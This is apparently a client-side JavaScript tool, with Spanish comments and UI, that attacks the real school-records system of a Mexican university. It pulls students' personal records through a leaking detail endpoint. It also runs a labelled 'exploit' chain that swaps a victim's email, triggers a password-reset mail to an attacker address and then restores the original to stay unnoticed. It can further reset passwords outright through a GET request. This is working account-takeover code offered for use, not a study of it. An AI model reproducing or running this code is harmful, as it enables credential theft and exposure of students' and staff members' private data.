//? Funciones Swal2
function swal2(type, title, body) {
  Swal.fire({
    title: title,
    html: body,
    icon: type,
    confirmButtonColor: "#1A5C50",
    confirmButtonText: "Confirmar",
    backdrop: false,
  });
}
//- Warning
//swal2('warning', 'ADVERTENCIA', 'Se recomienda encarecidamente leer la <a href="https://www.notion.so/UAEM-x-164abd56f0c0809a9acded7cd86e7a50?pvs=4" target="_blank">documentación en Notion<a> sobre este proyecto antes de usar esta función, particularmente la sección de <b>"Clase Persona"</b> y la subsección <b>"Modificar Datos Personales (Totalmente)"</b> en la sección de exploits.')

//region Inyección de Datos
//- Inyección de Datos
//? Constantes
const inputGlobal = document.getElementById("idGlobal");
const injectServerData = document.getElementById("injectServerData");

async function getServerData(idGlobal, visibilidad = true) {
  const endpoint = "https://controlescolar.uaemex.mx/dce/sicde/publico/commons/jsps/detalle.jsp?idPersona=";
  let url = endpoint + idGlobal;

  try {
    const respuesta = await fetch(url);

    // Aunque sea un error 500, el cuerpo de la respuesta puede ser leído.
    const htmlResponse = await respuesta.text();

    // Decodificar entidades HTML
    const decodedHtml = decodeHtmlEntities(htmlResponse);

    // Extraer el primer objeto <object> y su contenido
    const objectForm = getObject(decodedHtml);

    // Validar si se logro obtener un objeto dado el id proporcionado
    if (objectForm) {
      //? Mostrar el formulario
      //* Convertir las keys del object en inputs y crear las labels para cada input
      let inputsForm = objectToInputs(objectForm);
      let labelsForm = createLabels(inputsForm);

      //* Construir el formualrio
      let labelArray = labelsForm;
      let inputArray = inputsForm.split("\n");

      let dataForm = buildDataForm(labelArray, inputArray);

      //* Purgar información no modificable
      visibilidad === true ? dataForm = purgeDataForm(dataForm) : dataForm = purgeDataForm(dataForm, false);

      //* Inyectar el formualario
      dataForm === false ? injectServerData.innerHTML = '' : injectServerData.innerHTML = dataForm;
      
      //injectServerData.innerHTML = dataForm;
      return true;
    } else {
      console.error("No se encontró un elemento <object> en la respuesta.");
      swal2("error", "¡Ha ocurrido un error!", `El objectId: ${idGlobal} no parece ser un objeto valido, puede que sea un identificador fuera de rango o que no esta asociado a ningún objeto.`);
    }
  } catch (error) {
    console.error("Error al realizar la solicitud:", error);
    swal2("error", "¡Ha ocurrido un error!", `Ocurrio un error al realizar la petición: ${error}<br><br><b style="color: red;">Si lleva mucho tiempo usando esta sesión actualice el sitio, probablemente necesite logearse de nuevo pues la sesión caducó.</b>`);
  }
}

//? Función para decodificar entidades HTML
/* Los caracteres especiales que vienen en la respuesta vienen codificados, por lo que,
  la respuesta es un tanto ilegible, esta función convierte los caracteres codificados
  a su equivalente legible por los humanos.*/
function decodeHtmlEntities(encodedString) {
  const textarea = document.createElement("textarea");
  textarea.innerHTML = encodedString;
  return textarea.value;
}

//? Función para extraer el primer <object> del HTML decodificado
/* La respuesta de un error 500 incluye mucha información innecesaria, esta función
  elimina toda esa información y extrae unicamente la información importante, es decir
  el primer object (en caso de proporcionar un objectId Valido).
  */
function getObject(htmlString) {
  const objectRegex = /<object\b[^>]*>([\s\S]*?)<\/object>/i;
  const match = objectRegex.exec(htmlString);
  return match ? match[0] : null;
}

//? Función para convertir el object en un formulario
/* Mediante el uso de expresiones regulares, se convierte el object recibido en un
  formulario para mostrar en la ventana.
  ! ESTA FUNCIÓN ES POCO FIABLE, si un valor llegasé a coincdir con un patrón de las funciones
  ! replace, esto alteraria por completo la estructura del formulario y probablemente ni
  ! si quiera sería posible interpretarlo en el HTML, si bien, es poco probable este escenario
  ! tampoco es imposible...
   */
function objectToInputs(extractFirstObject) {
  replace = extractFirstObject.replace('">\n', "</field>\n"); //Modificar primer linea de codigo para que coincida con futuros patrones
  replace = replace.replace("</object>", ""); // Eliminar la ultima linea de codigo que no se usa
  replace = replace.replace('<object classKey="', '<field key="objectType">'); //Modificar la primera linea de codigo para que coincida con futuros patrones
  replace = replace.replace('" objectId="', '</field>\n<field key="objectId">'); // Partir la primera linea de codigo para que coincida con futuros patrones
  replace = replace.replace(/"\/>/g, '">NULL</field>'); // Modificar los fields nulos para que coincidan con futuros patrones
  replace = replace.replace(/field key=/g, 'input class="getServerData" type="text" id='); // Cambiar field por inputs
  replace = replace.replace(/">/g, '"disabled=true value="'); // Eliminiar los cierres de la primer etiqueta, el valor del key ahora sera el value del input
  replace = replace.replace(/<\/field>/g, '"/>'); // Eliminar la etiqueta field de cierre y cambiarla por un cierre para las etiqueras input

  /*
      Este metodo para generar los formularios tiene muchas formas de fallar debido a que nada asegura que algun patron anterior
      no coincida con un valor de la base de datos del SICDE, la siguiente linea se omite ya que es mera estetica y es posiblemente 
      el patrón que tiene más posibilidades de coincidir con un valor en la base de datos, usarse meramente si la estetica es necesaria:
      */
  replace = replace.replace(/    /g, "");

  return replace;
}

function createLabels(inputsForm) {
  const div = document.createElement("div");
  div.innerHTML = inputsForm;

  const elementos = div.querySelectorAll(".getServerData");
  let array = [];

  // Iterar sobre los elementos y obtener los ID
  elementos.forEach((elemento) => {
    array.push(`<label class="getServerData" for="${elemento.id}" id="lbl_${elemento.id}">${elemento.id}</label>`);
  });

  return array;
}

function buildDataForm(labelArray, inputArray) {
  let dataFormArray = [];

  labelArray.forEach((label, index) => {
    dataFormArray.push(label);
    dataFormArray.push(inputArray[index]);
  });

  return dataFormArray.join("\n");
}

function purgeDataForm(dataForm, visibilidad = true) {
  const div = document.createElement("div");
  div.innerHTML = dataForm;

  //? Validar si el objeto es de tipo persona.
  const objectTypeValue = div.querySelector("#objectType").value;
  if (objectTypeValue === "Persona") {
    //* Filtro 1: Ocultar campos no modificables.
    const hideElements = ["objectType", "objectId", "carac2", "carac3", "conDiscapacidad", "creationDate", "debilVisual", "domicilio", "enGrupoIndigena", "estadoCivil", "estadoDeNacimiento", "gradoAcademico", "grupoIndigena", "hablaDialecto", "id", "iniciales", "madreSoltera", "modificationDate", "municipioDeNacimiento", "nacionalidad", "paisDeNacimiento", "status", "tipoDeSangre", 'fechaDeNacimiento', 'identificadorNacional', 'imss', 'madre', 'nombreDelPadreoTutor', 'padre', 'rfc', 'sexo', 'email'];
    hideElements.forEach((element) => {
      let idObject = div.querySelector(`#${element}`);
      let lblObject = div.querySelector(`#lbl_${element}`);

      if (idObject) idObject.style.display = "none";
      if (lblObject) lblObject.style.display = "none";
    });

    //* Filtro 2: Modificar las labels de los campos modificables
    //innerText 
    const modifyLabels = ['apellidoMaterno', 'apellidoPaterno', 'nombre', 'carac1', 'email', 'emailUAEM', 'key'];
    const newLabels = ['Apellido Materno', 'Apellido Paterno', 'Nombre', 'Contraseña Email*', 'Email Personal', 'Email UAEM', 'Usuario SICDE'];

    modifyLabels.forEach((element, index) => {
      let lblObject = div.querySelector(`#lbl_${element}`);

      if (lblObject) lblObject.innerText = newLabels[index];
    });

    //* Filtro 3: Eliminar los elementos no usados
    let purgeForm = deleteUnusedItems(div.innerHTML);

    //* Filtro 4: Agregar botones
    if (visibilidad) {
      var isVisible = '';
    } else {
      var isVisible = 'style="display: none"';
    }
    
    const btnHeader = `<button class="btnHeader2" type="submit" onclick="getPersonalPassword()">Obtener Contraseña de Control Escolar</button>
    <button class="btnFooter" type="submit" ${isVisible} onclick="changePersonalPassword()">Cambiar Contraseña de Control Escolar</button>`;
    
    const btnFooter = `<button class="btnFooter2" type="submit" onclick="modifyEmails()">Modificar Emails</button>`;

    const footerButtons = `<div class="footerButtons">
    ${btnHeader}
    ${btnFooter}
    </div>`;
    

    //* Obtener sexo del alumno
    const searchSex = /id="sexo" value="(.*?)"><label class="getServerData" for="identificadorNacional"/;
    const selectTag_Masculino = `<select id="sexoSelect" style="display: none;">
        <option value=3468>MASCULINO</option>
        <option value=3469>FEMENINO</option>
      </select>`;

    const selectTag_Femenino = `<select id="sexoSelect" style="display: none;">
        <option value=3469>FEMENINO</option>
        <option value=3468>MASCULINO</option>
      </select>`;
    
    let selectTag;
    // Verifica si hay coincidencia y extrae el valor
    if (purgeForm.match(searchSex)) {
      const extractSex = purgeForm.match(searchSex)[1]; // El contenido capturado está en el primer grupo
      switch(extractSex) {
        case '3468':
          selectTag = selectTag_Masculino;
          break;
        case '3469':
          selectTag = selectTag_Femenino;
          break;
        default:
          selectTag = selectTag_Masculino;
          break;
      }
    }

    //* Hacer del input de sexo un selct
    purgeForm = purgeForm.replace(`<input class="getServerData" type="text" id="sexo"`, `${selectTag}<input class="getServerData" type="text" id="sexo" style="display: none;"`);

    //* Retornar el HTML procesado como una cadena
    return purgeForm + footerButtons;
  } else {
    //! ERROR: El objeto entrante no es de tipo Persona.
    swal2('error', 'Error de ObjectType', `El objectId proporcionado pertenece a un objeto de tipo "<b>${objectTypeValue}</b>" y no es compatible con esta función.`);
    return false;
  }
}

// Reordenar los elementos
function deleteUnusedItems(purgeDataForm) {
  const newOrder = ['nombre', 'apellidoPaterno', 'apellidoMaterno', 'key', 'email', 'emailUAEM', 'carac1', 'objectType', 'objectId', 'modificationDate', 'identificadorNacional']
  
  // Crear un contenedor temporal para manipular el HTML
  let container = document.createElement("div");
  container.innerHTML = purgeDataForm;

  // Array donde almacenaremos los elementos en el nuevo orden
  let newItems = [];

  // Iterar sobre el array de IDs de orden
  newOrder.forEach((id) => {
    // Buscar el label y el input asociados al ID
    let label = container.querySelector(`label[for="${id}"]`);
    let input = container.querySelector(`input[id="${id}"]`);

    // Añadirlos al array si existen
    if (label) newItems.push(label);
    if (input) newItems.push(input);
  });

  // Crear un nuevo contenedor con el formulario reordenado
  let nuevoFormulario = document.createElement("div");
  newItems.forEach((el) => nuevoFormulario.appendChild(el));

  // Devolver el HTML reordenado
  return nuevoFormulario.innerHTML;
}

//region Busqueda de Datos
//- Busqueda de Datos: Manual
function objectIdSearch() {
  document.getElementById("searchInput").value = "";
  document.getElementById("students").value = "SELECCIONE ALUMNO";
  const globalId = inputGlobal.value;
  getServerData(globalId, false);
}

//- Busqueda de Datos: Por lista de alumnos
var matricula = null;
var nombre = null;
var idAlumno = null;
var idPersona = null;
var plantel = null;
var licenciatura = null;
var studentData = null;

async function getObjectId(idPersona) {
  const endpoint = "https://controlescolar.uaemex.mx/dce/sicde/publico/commons/jsps/detalle.jsp?idPersona=";
  let url = endpoint + idPersona;

  try {
    const respuesta = await fetch(url);

    // Aunque sea un error 500, el cuerpo de la respuesta puede ser leído.
    let htmlResponse = await respuesta.text();
    htmlResponse = htmlResponse.replace(/[\s\S]*?(?=<input)/, "");
    htmlResponse = htmlResponse.replace(/name="__parameters__"[\s\S]*/, 'name="__parameters__"');
    htmlResponse = htmlResponse.replace(/">[\s\S]*/, "");
    htmlResponse = htmlResponse.replace(/[\s\S]*?(?=value=")/, "");
    htmlResponse = htmlResponse.replace('value="', "");

    return htmlResponse;
  } catch (error) {
    //! Error: objectId sin información.
    swal2("error", "¡Ha ocurrido un error!", `Ocurrio un error al intentar localizar el objectId asociado al idPersona: ${idPersona}<br><br>Error: ${error}`);
    console.error("Error al realizar la solicitud:", error);
    return false;
  }
}

// Realiza una petición AJAX para obtener los datos del archivo JSON
$(document).ready(function () {
  $.ajax({
    url: "../../../../../sources/data/students.json",
    type: "GET",
    dataType: "json",
    success: function (data) {
      var select = $("#students"); // Referencia al elemento select
      var records = data.RECORDS; // Almacena los registros obtenidos del JSON

      // Filtra los registros basados en la búsqueda, carrera y plantel
      function filterRecords(searchString, career, campus) {
        var filteredRecords = records.filter(function (record) {
          var matchSearch = searchString === "" || record.matricula.toLowerCase().includes(searchString.toLowerCase()) || record.nombre.toLowerCase().includes(searchString.toLowerCase());
          var matchCareer = career === "" || record.licenciatura === career;
          var matchCampus = campus === "" || record.plantel === campus;
          return matchSearch && matchCareer && matchCampus;
        });

        // Asegura que el primer registro siempre esté en la lista filtrada
        if (records.length > 0 && !filteredRecords.includes(records[0])) {
          filteredRecords.unshift(records[0]);
        }

        return filteredRecords;
      }

      // Llena las opciones del select con los registros filtrados
      function populateOptions(filteredRecords) {
        select.empty(); // Limpia las opciones anteriores
        $.each(filteredRecords, function (index, record) {
          var option = $("<option></option>").val(record.matricula).text(record.nombre);
          option.data("record", record); // Guarda el registro completo como data en la opción
          select.append(option); // Añade la opción al select
        });
      }

      // Maneja el evento de cambio en los campos de filtro
      $("#searchInput, #career, #campus").on("input change", function () {
        var searchString = $("#searchInput").val().trim();
        var career = $("#career").val();
        var campus = $("#campus").val();
        var filteredRecords = filterRecords(searchString, career, campus);
        populateOptions(filteredRecords); // Llena las opciones del select con los registros filtrados
      });

      // Inicialmente muestra todos los registros
      populateOptions(records);
    },
    error: function (jqXHR, textStatus, errorThrown) {
      function confirmCallback() {
        location.reload();
      }
      let errorBody = `<span style="color: var(--guinda)">No se ha encontrado el fichero <b>\\sources\\data\\students.json</b>.</span>
              <br><br>
              Para usar esta función del sistema necesita este arichvo, 
              puede descargarlo desde <a href="https://drive.google.com/file/d/1D0pklCj0LfELi5x6ZqZWsumozvau5N5k" target="_blank">aqui</a>.
              <br><br>
              Por seguridad, el archivo se encuentra protegido con contraseña, para solicitarla <a href=mailto:amberage.exe@gmail.com>pongasé en contacto con el desarrollador</a>.
  
               `;
      Swal.fire({
        title: "¡Error: Fichero Faltante!",
        html: errorBody,
        icon: "error",
        confirmButtonColor: "#1A5C50",
        confirmButtonText: "Ya tengo el archivo, recargar sitio.",
        backdrop: false,
        preConfirm: () => {
          if (confirmCallback && typeof confirmCallback === "function") {
            confirmCallback();
          }
          return true; // Retorna true explícitamente
        },
      });
      console.error("Error al obtener el JSON: ", textStatus, errorThrown); // Manejo de errores
    },
  });

  // Maneja el evento onchange del select de estudiantes
  $("#students").on("change", function () {
    var selectedMatricula = $(this).val(); // Obtén la matrícula seleccionada
    var selectedOption = $(this).find("option:selected");
    var selectedRecord = selectedOption.data("record"); // Obtén el registro completo asociado a la opción seleccionada
    studentData = selectedRecord;

    // Asegúrate de que el registro seleccionado existe
    if (selectedRecord) {
      matricula = selectedRecord.matricula;
      nombre = selectedRecord.nombre;
      idAlumno = selectedRecord.idAlumno;
      idPersona = selectedRecord.idPersona;
      plantel = selectedRecord.plantel;
      licenciatura = selectedRecord.licenciatura;

      if (matricula !== "SELECCIONE ALUMNO") {
        getObjectId(idPersona).then((objectId) => {
          if (objectId !== false) {
            document.getElementById("idGlobal").value = '';
            getServerData(objectId);
          }
        });
      }
    } else {
      console.warn("No se encontró el registro seleccionado."); // Advertencia si no se encuentra el registro
    }
  });
});

//region Modificar los Datos
function changePersonalPassword() {
  const apellidoMaterno = document.getElementById('apellidoMaterno').value;
  const apellidoPaterno = document.getElementById('apellidoPaterno').value;
  const nombre = document.getElementById('nombre').value;
  const matricula = document.getElementById('key').value;
  const fullName = nombre + apellidoPaterno + apellidoMaterno;
  Swal.fire({
    title: "Cambiar Contraseña",
    html: `Está intentando cambiar la contraseña de <strong>${fullName}</strong> con el usuario <strong>${matricula}</strong><br><br>Este metodo es demasiado intrusivo, agresivo y evidente, <b style="color: red;">NO SE RECOMIENDA USAR ESTE METODO</b>, en su lugar es mejor obtener la contraseña actual del usuario para ser más discretos.`,
    input: "text",
    icon: "warning",
    backdrop: false,
    inputAttributes: {
      autocapitalize: "off",
      placeholder: "Ingrese una nueva contraseña.",
      maxlength: 100,
      autocomplete: "off",
    },
    showCancelButton: true,
    confirmButtonText: "Cambiar Contraseña",
    showLoaderOnConfirm: true,
    allowEscapeKey: false,
    allowOutsideClick: false,
    preConfirm: (newPassword) => {
      /* if (newPassword.length < 6) {
        Swal.showValidationMessage('La contraseña debe tener al menos 6 caracteres');
        return false;
      } */
      let left = (screen.width - 600) / 2;
      let top = (screen.height - 400) / 2;

      const url = `https://controlescolar.uaemex.mx/dce/sicde/publico/alumnos/txs/update.jsp?__targetObjectId__=${idPersona}&__parameters__=&numeroCuenta=${matricula}&password=${newPassword}&confirmPasswordNew=${newPassword}`;
      window.open(url, "_blank", "toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=1375,height=650,left=" + left + ",top=" + top);
    },
  });
}


function modifyEmails() {
  swal2('info', '¡Función No Disponible!', 'No es posible modificar el email personal ni el email institucional desde esta función, para modificar estos datos ingrese a la sección correspondiente en <b>Inicio  > Joyride Tools > Modificar Datos Personales</b>')
}

async function changeEmail(email, errorMssg = '¡Ha ocurrido un error!') {
  const objectId = document.getElementById('objectId')?.value || '';
  const identificadorNacional = document.getElementById('identificadorNacional')?.value || '';
  const modificationDate = document.getElementById('modificationDate')?.value || '';

  // Sustituir 'NULL' o 'null' por una cadena vacía
  const array = [objectId, identificadorNacional, email, modificationDate].map(element =>
    element === 'NULL' || element === 'null' ? '' : element
  );

  // Construir el payload
  const endpoint = 'https://controlescolar.uaemex.mx/dce/sicde/publico/alumnos/txs/actualizaDatos.jsp';
  const payload = `__targetObjectId__=${array[0]}&__parameters__=&identificadorNacional=${array[1]}&email=${array[2]}&modificationDate=${array[3]}`;

  try {
    // Promesa de tiempo límite (timeout)
    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Tiempo de espera excedido (30 segundos).')), 30000)
    );

    // Ejecutar fetch con timeout
    const response = await Promise.race([
      fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: payload,
      }),
      timeout, // Se rechaza si el tiempo límite se excede
    ]);

    if (response.ok) {
      console.log(`Cambio de email ${email} exitoso.`);
      showToastrMessage('success', `Cambio de email exitoso a ${email}`);
      return true;
    } else {
      swal2('error', `ERROR`, errorMssg); // Muestra mensaje en caso de error
      console.error(`Error HTTP! Estado: ${response.status}`);
      return false;
    }
  } catch (error) {
    console.error("Error en la solicitud o tiempo límite excedido:", error.message);
    showToastrMessage('error', `Error en la solicitud: ${error.message}`);
    return false;
  }
}

async function sendPassword(email, tipoPersona) {
  let endpoint;

  // Construir la URL según el tipo de persona
  switch (tipoPersona) {
    case 'alumno':
      endpoint = `https://controlescolar.uaemex.mx/dce/sicde/publico/alumnos/site/enviaCorreo.jsp?email=${email}`;
      break;
    case 'profesor':
      endpoint = `https://controlescolar.uaemex.mx/dce/sicde/publico/profesores/site/enviaCorreo.jsp?email=${email}`;
      break;
    case 'sicde':
      endpoint = `https://controlescolar.uaemex.mx/dce/sicde/site/enviaCorreo.jsp?email=${email}`;
      break;
    default:
      console.error("Tipo de persona no válido:", tipoPersona);
      swal2('error', '¡OCURRIÓ UN ERROR!', 'Tipo de usuario no válido en la función sendEmail.');
      showToastrMessage('Error', `Tipo de persona inválido: ${tipoPersona}`);
      return false;
  }

  try {
    // Promesa de tiempo límite (timeout)
    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Tiempo de espera excedido (30 segundos).')), 30000)
    );

    // Ejecutar fetch con timeout
    const response = await Promise.race([
      fetch(endpoint, {
        method: "GET", // Cambiado a GET ya que `endpoint` es una URL
      }),
      timeout, // Se rechaza si el tiempo límite se excede
    ]);

    if (response.ok) {
      console.log(`Se solicitó la contraseña en el email: ${email}`);
      showToastrMessage('success', `Se solicitó la contraseña en el email ${email}`);

      // Temporizador de 5 segundos antes de retornar true
      await new Promise((resolve) => setTimeout(resolve, 3000));
      return true;
    } else {
      console.error(`Error HTTP! Estado: ${response.status}`);
      swal2('error', '¡OCURRIÓ UN ERROR!', `El servidor respondió con un error: ${response.statusText}`);
      return false;
    }
  } catch (error) {
    console.error("Error en la solicitud o tiempo límite excedido:", error.message);
    swal2('error', '¡OCURRIÓ UN ERROR!', error.message);
    return false;
  }
}


async function sendExploit(newEmail, originalEmail, tipoPersona) {
  try {
    if (await changeEmail(newEmail)) {
      if (await sendPassword(newEmail, tipoPersona)) {
        if (await changeEmail(originalEmail)) {
          console.log("El exploit se realizó de manera exitosa.");
          return true; // Retorna true si todo fue exitoso
        } else {
          console.log("Error en la tercera petición.");
          return false;
        }
      } else {
        console.log("Error en la segunda petición.");
        return false;
      }
    } else {
      console.log("Error en la primera petición.");
      return false;
    }
  } catch (error) {
    console.error("Error crítico:", error);
    throw error; // Propaga el error a la función `getPersonalPassword`
  }
}

/* function getPersonalPassword() {
  const userKey = document.getElementById('key').value;

  Swal.fire({
    title: "Solicitar Contraseña",
    html: `Esta función depende de la estabilidad y velocidad del servidor, por lo que se recomienda encarecidamente leer la <a href="https://www.notion.so/UAEM-x-164abd56f0c0809a9acded7cd86e7a50?pvs=4" target="_blank"> Documentación en Notion</a></p> sobre esta función. <br><br>Ingrese el email donde desea recibir la contraseña del usuario ${userKey}`,
    input: "text",
    icon: "warning",
    backdrop: false,
    inputAttributes: {
      autocapitalize: "off",
      placeholder: "Email donde desea recibir la contraseña...",
      maxlength: 100,
      autocomplete: "off",
    },
    showCancelButton: true,
    confirmButtonText: "Solicitar Contraseña",
    showLoaderOnConfirm: true,
    allowEscapeKey: false,
    allowOutsideClick: false,
    preConfirm: async (email) => {
      // Expresión regular para validar email
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        Swal.showValidationMessage('Por favor ingrese un email válido.');
        return false; // Bloquea la confirmación
      }

      //- Email Válido
      const newEmail = email;
      const originalEmail = document.getElementById('email').value;
      const tipoPersona = 'alumno';

      try {
        // Llamar a la función `hack` para ejecutar el exploit
        await sendExploit(newEmail, originalEmail, tipoPersona);

        // Confirmación visual para el usuario si `hack` es exitoso
        Swal.fire({
          title: "Solicitud Exitosa",
          text: `El exploit se ejecutó correctamente y la contraseña será enviada al correo ${newEmail}.`,
          icon: "success",
        });
      } catch (error) {
        console.error("Error en la ejecución del exploit:", error);

        // Mostrar mensaje de error si `hack` falla
        Swal.fire({
          title: "Error",
          text: "Ocurrió un problema durante la ejecución del exploit. Inténtelo nuevamente.",
          icon: "error",
        });
      }
    },
  });
} */

  function getPersonalPassword() {
    const userKey = document.getElementById('key').value;
  
    Swal.fire({
      title: "Solicitar Contraseña",
      html: `
        <p>Esta función depende de la estabilidad y velocidad del servidor, por lo que se recomienda encarecidamente leer la <a href="https://www.notion.so/UAEM-x-164abd56f0c0809a9acded7cd86e7a50?pvs=4" target="_blank"> Documentación en Notion</a>.</p>
        <br><br>
        <br>Ingrese el email donde desea recibir la contraseña del usuario ${userKey}.
        <input id="emailInput" type="text" class="swal2-input" placeholder="Email para recibir la contraseña.">
        <br><br>
        <label for="tipoPersona">Tipo de Perfil</label>
        <select id="tipoPersona" class="swal2-select">
            <option value="null">Seleccione Perfil</option>
            <option value="alumno">Alumno</option>
            <option value="profesor">Profesor</option>
            <option value="sicde">Control Escolar</option>
        </select>
      `,
      icon: "warning",
      backdrop: false,
      showCancelButton: true,
      confirmButtonText: "Solicitar Contraseña",
      showLoaderOnConfirm: true,
      allowEscapeKey: false,
      allowOutsideClick: false,
      preConfirm: async () => {
        const email = document.getElementById('emailInput').value;
        const tipoPersona = document.getElementById('tipoPersona').value;
  
        // Validaciones
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
          Swal.showValidationMessage('Por favor ingrese un email válido.');
          return false;
        }
        if (tipoPersona === "null") {
          Swal.showValidationMessage('Por favor seleccione un perfil válido.');
          return false;
        }
  
        // Datos validados
        const newEmail = email;
        const originalEmail = document.getElementById('email').value;
  
        try {
          // Llamar a la función `hack` para ejecutar el exploit
          await sendExploit(newEmail, originalEmail, tipoPersona);
  
          // Confirmación visual
          Swal.fire({
            title: "Solicitud Exitosa",
            text: `El exploit se ejecutó correctamente y la contraseña será enviada al correo ${newEmail}.`,
            icon: "success",
          });
        } catch (error) {
          console.error("Error en la ejecución del exploit:", error);
  
          Swal.fire({
            title: "Error",
            text: "Ocurrió un problema durante la ejecución del exploit. Inténtelo nuevamente.",
            icon: "error",
          });
        }
      },
    });
  }